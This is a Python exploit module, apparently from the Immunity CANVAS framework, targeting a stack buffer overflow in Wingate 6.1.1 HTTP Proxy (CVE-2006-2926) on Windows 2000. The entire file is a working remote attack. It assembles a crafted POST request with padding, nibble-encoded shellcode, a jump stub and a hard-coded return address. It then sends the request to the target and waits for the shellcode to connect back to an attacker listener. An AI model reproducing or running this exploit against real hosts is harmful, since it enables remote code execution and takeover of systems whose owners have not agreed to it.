#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2003-2006
#http://www.immunityinc.com/CANVAS/ for more information

# Wingate HTTP Proxy
#
# Bug Class: Stack overflow

import sys
if "." not in sys.path: sys.path.append(".")

import os
import getopt
import socket
import struct
import time

# CANVAS modules
from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef
from canvasengine import WIN32MOSDEF
from encoder import nibble_encoder
        
# GUI info
NAME="Wingate 6.1.1 remote exploit"
DESCRIPTION="Wingate 6.1.1 stack overflow"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Wingate.com"
DOCUMENTATION["Date public"] = "06-2006"
DOCUMENTATION["References"] = ""
DOCUMENTATION["Repeatability"]="You get one shot"
DOCUMENTATION["CVE Name"] = "CVE-2006-2926"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-2926"
DOCUMENTATION['CVSS'] = 7.5

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000" ]

NOTES="""
"""

CHANGELOG="""
"""

targets = {
    0 : ["N/A", 0x00000000],
    1 : ["Wingate 6.11", 0x1161932],
    2 : ["Crash target", 0x41424344] 
          }

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setInfo(DESCRIPTION)
        self.name=NAME
        self.host = "192.168.0.6"
        self.port = 80
        # targets default version
        self.version = 1

        self.info, self.eip = targets[self.version]
        # shellcode place holder 
        self.shellcode = "\xcc" * 2048

        # chars to exclude in shellcode generation
        self.badstring = "/:\\%\x00\x0a\x0d&? 0\xfe'\"\x2e"
        # localhost and localport used in shellcode
        self.localhost = "127.0.0.1"
        self.localport = 5000
        return
    
    def neededListenerTypes(self):

        return [WIN32MOSDEF]
    
    def connectToHost(self):
        s = self.gettcpsock()
        s.connect((self.host, self.port))
        return s
    
    def test(self):
        return 0
    
    def createShellcode(self):
        host = self.callback.ip
        port = self.callback.port
        self.createWin32Shellcode("", host, port)

        encoder = nibble_encoder.intel_nibbleencoder()
        encoder.setbadstring(self.badstring)
        self.shellcode = encoder.encode(self.shellcode)
        return self.shellcode
   
    def build_string(self, x_len, retadd):
        self.shellcode = self.shellcode
        x_string = "A" * (2200 - len(self.shellcode) )
        x_string+= self.shellcode 
        jump = mosdef.assemble("jmp $-0x%x" % (len(self.shellcode)+0x20), "X86" )
        #print "jmp $-0x%x" % len(self.shellcode)
        x_string+= jump
        x_string+= "B" * (0x54 - len(jump))
        x_string+= struct.pack("<L", retadd)
        x_string+= "C" * 900
        
        return "POST http://" + x_string + "/ HTTP/1.0\r\n\r\n" 
    
    def run(self):
        self.host = self.target.interface
        if "port" in self.argsDict:
            self.port = int(self.argsDict["port"])

        self.setInfo("%s attacking %s:%d (in progress)"% (NAME, self.host, self.port))

        if self.version == 0:
            self.setInfo("%s attacking %s:%d - done (no autoversioning!)"% (NAME, self.host, self.port))
            return 0

        self.info, self.eip = targets[self.version]

        try:
            s = self.connectToHost()
        except:
            self.setInfo("%s attacking %s:%d - done (failed!)"% (NAME, self.host, self.port))
            self.log("Could not connect to %s:%d"% (self.host, self.port))
            return 0
        
        x_string = self.build_string(3000,  self.eip)
        s.send(x_string)
        ret = 0

        time.sleep(3)        
        ret = self.ISucceeded()
        if not ret:
            ret = self.ISucceeded()

        if ret:
            self.setInfo("%s attacking %s:%d - done (success!)"% (NAME, self.host, self.port))
            return 1

        self.setInfo("%s attacking %s:%d - done (failed)"% (NAME, self.host, self.port))
        return 0

    def displayVersions(self):
        i = 0
        for listline in targets.values():
            print "%d : %s"% (i, listline[0])
            i = i + 1

if __name__== '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)

